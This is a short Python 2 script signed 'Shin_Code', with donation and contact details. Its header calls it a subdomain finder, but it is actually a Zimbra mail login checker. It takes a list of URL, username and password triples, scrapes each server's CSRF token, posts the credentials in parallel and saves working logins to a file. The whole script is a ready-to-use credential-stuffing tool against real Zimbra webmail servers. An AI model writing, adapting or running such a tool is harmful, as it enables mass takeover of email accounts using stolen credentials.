# -*- coding: utf-8 -*
#!/usr/bin/python
#Subdomain Finder !
# Coded Shin_Code
#My Friendo : JametKNTLS -  h0d3_g4n - Moslem And All Coders
# Blog : https://www.blog-gan.org          
#Buy coffee :
	# BTC = 31mtLHqhaXXyCMnT2EU73U8fwYwigiEEU1
	# PERFECT MONEY  = U22270614
#CONTACT ME :(
       # ICQ : https://icq.im/Shin403
       # Telegram : t.me/Shin_code
       # Youtube : Smile Of Beauty 
# Apakah kamu hanya bisa melakukan recode dengan mengganti nama author?
# Can you only recode by changing the author name?
############# [ Module ] #############
import requests,os,re
import concurrent.futures
from colorama import Fore
import time

def checkzimbra(string):
	try:
		string = str(string).split('|')
		url = str(string[0]).strip()
		user = str(string[1]).strip()
		pwd = str(string[2]).strip()
		headers={'User-Agent': 'Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro Build/SKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36'}
		mekdi = requests.get(url+'/?loginOp=relogin&client=mobile&loginErrorCode=service.AUTH_REQUIRED',headers=headers).content
		regex = re.findall('name="login_csrf" value="(.*?)"/>',mekdi)
		data = {'loginOp': 'login',
		'login_csrf': regex[0],
		'username': user,
		'password': pwd,
		'client': 'preferred'
		}
		cokis = {'ZM_TEST':'true',
		'ZM_LOGIN_CSRF': regex[0]}
		janco = requests.post(url,data=data,cookies=cokis,allow_redirects=True,headers=headers,timeout=15).content
		if 'loginOp=logout&client=mobile' in janco:
			print(Fore.GREEN +"[Success Login] ==> "+" "+ Fore.RESET+ url+'|'+user+'|'+pwd)
			open("Zimbra_Success.txt","a").write(url+'|'+user+'|'+pwd+"\n")
		else:
			print(Fore.RED +"[Bad Login] ==> "+" "+ Fore.RESET+ url+'|'+user+'|'+pwd)
	except:
		pass
	
if __name__ == '__main__':
	os.system('cls' if os.name == 'nt' else 'clear')
	print "{} Zimbra Valid Login Checker  !!!  | {}Shin Code\n".format(Fore.YELLOW,Fore.CYAN)
	sites = open(raw_input(Fore.BLUE + '--> Enter Your List : ' + Fore.RESET), 'r').read().splitlines()
	try:
		with concurrent.futures.ThreadPoolExecutor(3) as executor:
			executor.map(checkzimbra, sites)
	except Exception as e:
		print(e)
		print('Shin_Code Here !!!')